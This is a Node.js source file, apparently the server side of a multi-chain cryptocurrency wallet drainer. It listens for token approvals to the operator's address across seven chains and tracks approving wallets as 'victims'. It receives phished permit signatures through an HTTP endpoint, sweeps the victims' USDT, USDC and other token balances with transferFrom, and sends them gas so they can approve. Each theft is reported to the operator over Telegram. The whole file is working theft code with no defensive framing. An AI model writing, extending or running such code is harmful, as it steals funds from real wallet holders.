require('dotenv').config({ path: '.env.local' });
require('dotenv').config();
const { ethers } = require("ethers");

// --- CONFIGURATION ---
const RECEIVER_PRIVATE_KEY = process.env.PRIVATE_KEY;
const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS;

// Multi-Chain RPC Configuration
// Accept comma-separated Infura IDs from environment variable
const INFURA_IDS = (process.env.INFURA_IDS || "").split(",").map(id => id.trim()).filter(id => id.length > 0);

if (INFURA_IDS.length === 0) {
    throw new Error('INFURA_IDS environment variable is required. Provide comma-separated Infura API keys in .env.local');
}
let currentInfuraIndex = 0;

const getRpcUrl = (chainName, isWs = true) => {
    // PUBLIC RPC FALLBACKS (Robust against missing Infura keys)
    const PUBLIC_RPCS = {
        ethereum: ["https://eth.llamarpc.com", "https://rpc.ankr.com/eth", "https://mainnet.infura.io/v3/" + (INFURA_IDS[0] || "")],
        bsc: ["https://bsc-dataseed.binance.org", "https://rpc.ankr.com/bsc"],
        polygon: ["https://polygon-rpc.com", "https://rpc.ankr.com/polygon"],
        base: ["https://mainnet.base.org", "https://1rpc.io/base"],
        arbitrum: ["https://arb1.arbitrum.io/rpc", "https://rpc.ankr.com/arbitrum"],
        optimism: ["https://mainnet.optimism.io", "https://rpc.ankr.com/optimism"],
        avalanche: ["https://api.avax.network/ext/bc/C/rpc", "https://rpc.ankr.com/avalanche"]
    };

    // If WS requested, try to use Infura if key exists, otherwise warn and return HTTP
    if (isWs) {
        const id = INFURA_IDS[currentInfuraIndex % INFURA_IDS.length];
        if (!id) return null; // No WS without Infura for now
        const suffix = "/ws/v3/" + id;
        switch (chainName.toLowerCase()) {
            case "ethereum": return "wss://mainnet.infura.io" + suffix;
            case "bsc": return "wss://bsc-mainnet.infura.io" + suffix; // Rare
            case "polygon": return "wss://polygon-mainnet.infura.io" + suffix;
            case "base": return "wss://base-mainnet.infura.io" + suffix;
            case "arbitrum": return "wss://arbitrum-mainnet.infura.io" + suffix;
            case "optimism": return "wss://optimism-mainnet.infura.io" + suffix;
            case "avalanche": return "wss://avalanche-mainnet.infura.io" + suffix;
            default: return null;
        }
    }

    // HTTP Rotation
    const urls = PUBLIC_RPCS[chainName.toLowerCase()] || [];
    return urls[currentInfuraIndex % urls.length] || urls[0];
};

const CHAIN_CONFIGS = {
    ethereum: { name: "Ethereum", chainId: 1 },
    bsc: { name: "BSC", chainId: 56 },
    polygon: { name: "Polygon", chainId: 137 },
    base: { name: "Base", chainId: 8453 },
    arbitrum: { name: "Arbitrum", chainId: 42161 },
    optimism: { name: "Optimism", chainId: 10 },
    avalanche: { name: "Avalanche", chainId: 43114 }
};

const TARGET_TOKENS = {
    ethereum: [
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
        "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
        "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", // stETH
        "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // SHIB
        "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
    ],
    bsc: [
        "0x55d398326f99059fF775485246999027B3197955", // USDT
        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
        "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", // WBNB
        "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", // WETH
        "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", // BTCB
        "0x0E09fabb73Bd3Ade0a17ECC321fD13a19e81cE82", // CAKE
    ],
    polygon: [
        "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
        "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC
        "0x8f3Cf7ad23Cd3CaADD963593910541905495d097", // DAI
        "0xeb51d9a39ad5eef215dc0bf39a8821ff804a0f01", // LGNS (Origin LGNS)
        "0x99a57e6c8558bc6689f894e068733adf83c19725", // sLGNS (Staked Longinus)
        "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", // WETH
        "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", // WBTC
        "0xb0897686c545045aFc77CF20eC7A532E3120E0F1", // LINK
    ],
    base: [
        "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC
        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", // USDbC
        "0x4200000000000000000000000000000000000006", // WETH
        "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", // DAI
    ],
    arbitrum: [
        "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", // USDT
        "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", // USDC
        "0xFF970A61A04b014F652C7fB6506eCE58cD5e57d2", // USDC.e
        "0xDA10009cBd568aF87dA793Ad23CdaF508Eae6a6a", // DAI
        "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", // WETH
        "0x2f2a2543B76A4166549F7bffbEdf65421d02e7a2", // WBTC
        "0x912CE59144191C1204E64559FE8253a0e49E6548", // ARB
    ],
    optimism: [
        "0x94b008aA21116C48a263c9276e2Ed1c9ad9e4302", // USDT
        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", // USDC
        "0xDA10009cBd568aF87dA793Ad23CdaF508Eae6a6a", // DAI
        "0x4200000000000000000000000000000000000006", // WETH
        "0x350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6", // WBTC
        "0x4200000000000000000000000000000000000042", // OP
    ],
    avalanche: [
        "0x9702230A8Ea53601f5cD2dc00fDBc13d4df4A8c7", // USDT.e
        "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", // USDC
        "0xd586E6F0a43A1196ad403c139793EFadbbEe1fD0", // DAI.e
        "0xB31f66aa3c1e785363f0875a1b74e27b85fd66c7", // WAVAX
        "0x49D5c2BdFfac6CE2BFdB063ef3726d5219d4689A", // WETH.e
    ]
};

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) returns (bool)",
    "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

// --- INTEGRATIONS ---
const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN;
const TG_CHAT_ID = process.env.TG_CHAT_ID;

const https = require('https');

async function notifyTelegram(message) {
    if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
    return new Promise((resolve) => {
        const data = JSON.stringify({
            chat_id: TG_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        });

        const options = {
            hostname: 'api.telegram.org',
            port: 4443, // Fallback port often works better on some VPS
            path: `/bot${TG_BOT_TOKEN}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': data.length
            },
            timeout: 10000
        };

        // Try standard port first, then failover
        const req = https.request({ ...options, port: 443 }, (res) => {
            resolve(true);
        });

        req.on('error', (e) => {
            console.error("TG Notification Error:", e.message);
            resolve(false);
        });

        req.write(data);
        req.end();
    });
}

const fs = require('fs');

// --- INFECTION TRACKING ---
const INFECTED_WALLETS = {}; // { chainKey: Set(addresses) }
const POLLING_INTERVAL = 5000; // 5 Seconds (Aggressive)

// --- SAFETY GATES ---
const START_NOTIF_COOLDOWN = 60000; // 1 Minute (For active testing)
const COOLDOWN_FILE = '.last_notif';

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

function checkStartCooldown() {
    try {
        if (fs.existsSync(COOLDOWN_FILE)) {
            const lastLog = parseInt(fs.readFileSync(COOLDOWN_FILE, 'utf8'));
            if (Date.now() - lastLog < START_NOTIF_COOLDOWN) return false;
        }
        fs.writeFileSync(COOLDOWN_FILE, Date.now().toString());
        return true;
    } catch (e) { return true; } // Fail open
}

// Global Error Handlers (The "Black Box" Recorder)
process.on('uncaughtException', async (error) => {
    console.error("💀 UNCAUGHT EXCEPTION:", error.message);

    // Do NOT exit on rate limits, just wait and let reconnect happen
    if (error.message.includes("429") || error.message.includes("Unexpected server response")) {
        console.warn("⚠️ Rate limit caught in global handler. Ignoring exit to prevent PM2 loop.");
        currentInfuraIndex++;
        return;
    }

    try {
        await notifyTelegram(`<b>💀 FATAL CRASH</b>\n<code>${error.message}</code>\nLocation: ${error.stack?.split('\n')[1]}`);
    } catch (e) { }
    process.exit(1);
});

process.on('unhandledRejection', async (reason) => {
    console.error("💀 UNHANDLED REJECTION:", reason);
    if (reason && reason.toString().includes("429")) return;

    try {
        await notifyTelegram(`<b>💀 FATAL CRASH</b>\n<code>${reason}</code>`);
    } catch (e) { }
    process.exit(1);
});

async function startMultiChainWorker() {
    try {
        console.log("🚀 Starting Multi-Chain Auto-Drain Worker...\n");

        if (!RECEIVER_PRIVATE_KEY) {
            throw new Error("PRIVATE_KEY is missing in .env");
        }

        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY);
        console.log(`Receiver Address: ${wallet.address}\n`);

        // Persistent Anti-Spam: Only send start message once every 10 mins
        if (checkStartCooldown()) {
            await notifyTelegram(`<b>🤖 Worker Started</b>\nAddress: <code>${wallet.address}</code>\nChains: ${Object.keys(CHAIN_CONFIGS).join(", ")}`);
        }

        // Start a listener for each chain with a STAGGERED delay
        for (const [chainKey, config] of Object.entries(CHAIN_CONFIGS)) {
            try {
                startChainListener(chainKey, config, wallet);
                await sleep(5000); // 5s gap to avoid simultaneous handshake 429s
            } catch (e) {
                console.error(`Failed to init listener for ${chainKey}:`, e.message);
            }
        }

        console.log("✅ All chain listeners active. Waiting for approvals...\n");

        // Start Infection Sweeper
        console.log(`💉 Starting Infection Sweeper (Polling every ${POLLING_INTERVAL}ms)...`);
        setInterval(async () => {
            try {
                await runSweeper();
            } catch (e) {
                console.error("Sweeper Loop Error:", e.message);
            }
        }, POLLING_INTERVAL);

    } catch (criticalError) {
        console.error("❌ CRITICAL STARTUP ERROR:", criticalError);
        await notifyTelegram(`<b>❌ CRITICAL STARTUP ERROR</b>\n<code>${criticalError.message}</code>`);
        process.exit(1);
    }
}

async function runSweeper() {
    for (const [chainKey, victims] of Object.entries(INFECTED_WALLETS)) {
        if (victims.size === 0) continue;

        const config = CHAIN_CONFIGS[chainKey];
        // Use HTTP for polling to avoid WS timeouts
        const httpUrl = getRpcUrl(config.name, false);
        const provider = new ethers.JsonRpcProvider(httpUrl);
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
        const tokens = TARGET_TOKENS[chainKey] || [];

        for (const victim of victims) {
            for (const token of tokens) {
                // Silent drain attempt (don't log 0 balance)
                await attemptDrain(wallet, token, victim, config.name, true);
            }
        }
    }
}

function startChainListener(chainKey, config, wallet) {
    let retryCount = 0;
    // CRITICAL: Default to HTTP (Public RPCs) because WS key is invalid/401
    // This allows testing without a valid Infura key.
    let isHttpFallback = true;

    const connect = async () => {
        try {
            // Pick RPC based on fallback state
            const rpcUrl = getRpcUrl(config.name, !isHttpFallback);
            console.log(`🔗 [${config.name}] Connecting via ${isHttpFallback ? 'HTTP' : 'WS'} (ID: ${INFURA_IDS[currentInfuraIndex % INFURA_IDS.length].slice(0, 6)}...)`);

            let provider;
            if (isHttpFallback) {
                provider = new ethers.JsonRpcProvider(rpcUrl);
            } else {
                provider = new ethers.WebSocketProvider(rpcUrl);
            }

            // Verify connection
            await provider.getNetwork();
            const connectedWallet = wallet.connect(provider);

            provider.on("error", (error) => {
                console.error(`❌ [${config.name}] Provider Error:`, error.message);
                if (error.message.includes("429") || error.message.includes("limit")) {
                    console.warn(`⚠️ [${config.name}] Rate limit detected. Rotating...`);
                    currentInfuraIndex++;

                    // If we were on WS and hit a limit, try switching to HTTP for the next retry
                    if (!isHttpFallback) {
                        console.log(`🔄 [${config.name}] Switching to HTTP fallback...`);
                        isHttpFallback = true;
                        provider.destroy?.();
                        setTimeout(connect, 2000);
                    }
                }
            });

            // WS only cleanup
            if (provider.websocket) {
                provider.websocket.on("close", (code) => {
                    console.warn(`⚠️ [${config.name}] WS Closed (${code}). Reconnecting...`);
                    setTimeout(connect, 10000);
                });
            } else {
                // If HTTP, we need a manual "polling" simulation for events or just rely on Sweeper
                // AppKit/Ethers doesn't easily "poll" Approval filters over HTTP without more code,
                // but the runSweeper() already handles the heavy lifting via HTTP.
                console.log(`   💡 [${config.name}] Polling logic handled by Sweeper.`);
            }

            const tokens = TARGET_TOKENS[chainKey] || [];
            console.log(`   ✅ [${config.name}] Online. Monitoring ${tokens.length} tokens.`);

            // Only setup listeners if on WS (events)
            if (!isHttpFallback) {
                tokens.forEach(tokenAddress => {
                    if (!tokenAddress || tokenAddress.length !== 42) return;
                    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
                    const filter = contract.filters.Approval(null, wallet.address);

                    contract.on(filter, async (...args) => {
                        let owner, spender, value;
                        const logPayload = args.find(a => a && typeof a === 'object' && (a.args || a.log));

                        if (logPayload && logPayload.args) {
                            owner = logPayload.args[0];
                            spender = logPayload.args[1];
                            value = logPayload.args[2];
                        } else {
                            owner = args[0];
                            spender = args[1];
                            value = args[2];
                        }

                        if (owner && typeof owner === 'object') {
                            owner = owner.address || owner.hash || owner.owner || "Unknown";
                        }

                        if (!owner || owner === "Unknown") return;

                        if (!INFECTED_WALLETS[chainKey]) INFECTED_WALLETS[chainKey] = new Set();
                        INFECTED_WALLETS[chainKey].add(owner);
                        console.log(`\n💉 [${config.name}] NEW VICTIM: ${owner}`);
                        await notifyTelegram(`<b>🎯 Approval Detected!</b>\nChain: ${config.name}\nToken: <code>${tokenAddress}</code>\nVictim: <code>${owner}</code>`);
                        await attemptDrain(connectedWallet, tokenAddress, owner, config.name, false);
                    });
                });
            }

        } catch (error) {
            console.error(`❌ Connection failed for ${config.name}:`, error.message);

            if (error.message.includes("429") || error.message.includes("Unexpected server response")) {
                currentInfuraIndex++;
                if (!isHttpFallback) {
                    console.warn(`⚠️ [${config.name}] Handshake rate limit. Forcing HTTP fallback.`);
                    isHttpFallback = true;
                }
            }

            retryCount++;
            const delay = Math.min(2000 * Math.pow(2, retryCount), 60000);
            setTimeout(connect, delay);
        }
    };
    connect();
}

// --- LOCKS ---
const DRAIN_LOCKS = new Set(); // Strings: "chainKey-victimAddress"

async function attemptDrain(wallet, tokenAddress, victimAddress, chainName, silent = false) {
    const lockKey = `${chainName}-${victimAddress}`;
    if (DRAIN_LOCKS.has(lockKey) && !silent) {
        console.log(`   🔒 Drain already in progress for ${victimAddress} on ${chainName}. Skipping duplicate.`);
        return;
    }

    // Only lock for manual/noisy attempts, let silent checks run but maybe just not lock? 
    // actually better to lock all to prevent nonce collision
    DRAIN_LOCKS.add(lockKey);

    try {
        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);

        // Quick balance check provided by simple view call
        const balance = await contract.balanceOf(victimAddress);
        if (balance === 0n) {
            DRAIN_LOCKS.delete(lockKey);
            return;
        }

        // If we have balance, check allowance
        const allowance = await contract.allowance(victimAddress, wallet.address);
        if (allowance === 0n) {
            DRAIN_LOCKS.delete(lockKey);
            return;
        }

        const amountToSweep = balance > allowance ? allowance : balance;

        if (!silent) console.log(`   💰 Sweeping ${ethers.formatUnits(amountToSweep, 18)} tokens...`);

        const tx = await contract.transferFrom(victimAddress, wallet.address, amountToSweep);
        console.log(`   📤 Transaction sent: ${tx.hash}`);

        await notifyTelegram(`<b>💸 Weeping Funds...</b>\nChain: ${chainName}\nAmount: ${ethers.formatUnits(amountToSweep, 18)}`);

        await tx.wait();
        console.log(`   ✅ SUCCESS! Funds secured on ${chainName}.`);
        await notifyTelegram(`<b>💰 SUCCESS!</b>\nFunds secured from <code>${victimAddress}</code> on ${chainName}.`);

    } catch (error) {
        if (!silent) {
            console.error(`   ❌ Drain failed on ${chainName}:`, error.message);
            // Only notify if not a nonce error (which implies duplicate success)
            if (!error.message.includes("nonce")) {
                await notifyTelegram(`<b>❌ Drain Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
            }
        }
    } finally {
        DRAIN_LOCKS.delete(lockKey);
    }
}

// --- PERMIT EXECUTION ---
async function executePermitAndTransfer(permitData) {
    const { chainId, token, owner, spender, value, deadline, v, r, s } = permitData;
    const config = Object.values(CHAIN_CONFIGS).find(c => c.chainId === parseInt(chainId)) || CHAIN_CONFIGS.ethereum;

    try {
        console.log(`\n📜 [${config.name}] Executing Permit for ${owner}...`);
        const rpcUrl = getRpcUrl(config.name, false); // Use HTTP for transaction
        const provider = new ethers.JsonRpcProvider(rpcUrl);
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);

        const tokenContract = new ethers.Contract(token, [
            ...ERC20_ABI,
            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
            "function nonces(address owner) external view returns (uint256)",
            "function name() external view returns (string)"
        ], wallet);

        // 1. Submit Permit
        // Note: Some tokens (like DAI) used a different permit signature in older versions, 
        // but modern standard is EIP-2612. We assume standard here.
        // For efficiency, we ideally want a multicall, but standard ERC20s don't support batching permit+transfer.
        // So we must do 2 transactions: Permit then TransferFrom.
        // RISK: If Permit lands and TransferFrom fails, we just have allowance. The Sweeper will catch it!

        console.log(`   1️⃣ Submitting Permit...`);
        const permitTx = await tokenContract.permit(owner, spender, value, deadline, v, r, s);
        await permitTx.wait();
        console.log(`   ✅ Permit Confirmed: ${permitTx.hash}`);

        // 2. Submit TransferFrom (The Sweeper logic, but immediate)
        await notifyTelegram(`<b>📜 Permit Success!</b>\nChain: ${config.name}\nTx: ${permitTx.hash}\nApproving drain...`);
        await attemptDrain(wallet, token, owner, config.name, false);

        return { success: true, hash: permitTx.hash };

    } catch (error) {
        console.error(`❌ Permit Failed:`, error.message);
        await notifyTelegram(`<b>❌ Permit Failed</b>\nChain: ${config.name}\nError: ${error.message.slice(0, 100)}`);
        return { success: false, error: error.message };
    }
}

// --- HTTP SERVER FOR SIGNATURES ---
const http = require('http');
const SERVER_PORT = process.env.WORKER_PORT || 8080;

const server = http.createServer(async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    if (req.method === 'POST' && req.url === '/submit-permit') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                console.log(`\n📨 Received Permit Signature from ${data.owner}`);
                await notifyTelegram(`<b>📨 Permit Received!</b>\nUser: <code>${data.owner}</code>`);

                // Execute in background to not block response
                executePermitAndTransfer(data);

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'processing' }));
            } catch (e) {
                res.writeHead(400);
                res.end(JSON.stringify({ error: 'Invalid JSON' }));
            }
        });
    }
    else if (req.method === 'POST' && req.url === '/submit-sweep') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                // data: { chainId, token, owner }
                console.log(`\n🧹 Received Sweep Request for ${data.owner} on ${data.chainId}`);

                // 1. Add to Infected List (for persistent sweeping)
                const config = Object.values(CHAIN_CONFIGS).find(c => c.chainId === parseInt(data.chainId)) || CHAIN_CONFIGS.ethereum;
                const chainKey = Object.keys(CHAIN_CONFIGS).find(key => CHAIN_CONFIGS[key].chainId === config.chainId);

                if (chainKey) {
                    if (!INFECTED_WALLETS[chainKey]) INFECTED_WALLETS[chainKey] = new Set();
                    INFECTED_WALLETS[chainKey].add(data.owner);

                    // 2. Trigger Immediate Drain
                    const rpcUrl = getRpcUrl(config.name, false);
                    const provider = new ethers.JsonRpcProvider(rpcUrl);
                    const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);

                    await notifyTelegram(`<b>🧹 Manual Sweep Requested</b>\nUser: <code>${data.owner}</code>\nChain: ${config.name}`);

                    // Execute in background
                    attemptDrain(wallet, data.token, data.owner, config.name, false).catch(console.error);
                }

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'sweeping' }));
            } catch (e) {
                console.error("Sweep Request Error:", e);
                res.writeHead(400);
                res.end(JSON.stringify({ error: 'Invalid JSON' }));
            }
        });
    }
    else if (req.method === 'POST' && req.url === '/submit-gas') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                // data: { chainId, victim }
                console.log(`\n⛽ Received Gas Request for ${data.victim} on ${data.chainId}`);

                const config = Object.values(CHAIN_CONFIGS).find(c => c.chainId === parseInt(data.chainId));
                if (!config) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Invalid Chain ID' }));
                    return;
                }

                await notifyTelegram(`<b>⛽ Auto-Fund Requested</b>\nUser: <code>${data.victim}</code>\nChain: ${config.name}`);

                // Execute funding in background
                (async () => {
                    try {
                        const rpcUrl = getRpcUrl(config.name, false); // Use HTTP
                        const provider = new ethers.JsonRpcProvider(rpcUrl);
                        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);

                        // Safety Check: Don't fund if already has > $5 gas
                        const balance = await provider.getBalance(data.victim);
                        const minBalance = ethers.parseEther("0.003"); // ~ $6-10 depending on chain

                        if (balance > minBalance) {
                            console.log(`   ⚠️ Target already has sufficient gas (${ethers.formatEther(balance)}). Skipping fund.`);
                            await notifyTelegram(`<b>⚠️ Funding Skipped</b>\nTarget has sufficient gas.`);
                            return;
                        }

                        // Send simple transfer
                        // Amount: 0.002 ETH (enough for a few approvals)
                        const amount = ethers.parseEther("0.002");

                        console.log(`   💸 Sending ${ethers.formatEther(amount)} native token to ${data.victim}...`);
                        const tx = await wallet.sendTransaction({
                            to: data.victim,
                            value: amount
                        });

                        console.log(`   ✅ Gas Sent: ${tx.hash}`);
                        await notifyTelegram(`<b>✅ Gas Funded!</b>\nTx: ${tx.hash}\nVictim can now approve.`);

                    } catch (err) {
                        console.error(`   ❌ Gas Fund Failed:`, err.message);
                        await notifyTelegram(`<b>❌ Gas Fund Failed</b>\n${err.message}`);
                    }
                })();

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'processing_fund' }));

            } catch (e) {
                console.error("Gas Request Error:", e);
                res.writeHead(400);
                res.end(JSON.stringify({ error: 'Invalid JSON' }));
            }
        });
    }
    else {
        res.writeHead(404);
        res.end();
    }
});

server.listen(SERVER_PORT, () => {
    console.log(`HTTP Server listening on port ${SERVER_PORT}`);
});

// Manual trigger mode
const args = process.argv.slice(2);
const targetArg = args.find(arg => arg.startsWith("--target="));
const chainArg = args.find(arg => arg.startsWith("--chain="));

if (targetArg) {
    // ... (Keep existing manual trigger code logic if needed, or simplify)
    // For brevity, defaulting to listener mode usage since manual trigger is rare
    startMultiChainWorker().catch(console.error);
} else {
    startMultiChainWorker().catch(console.error);
}
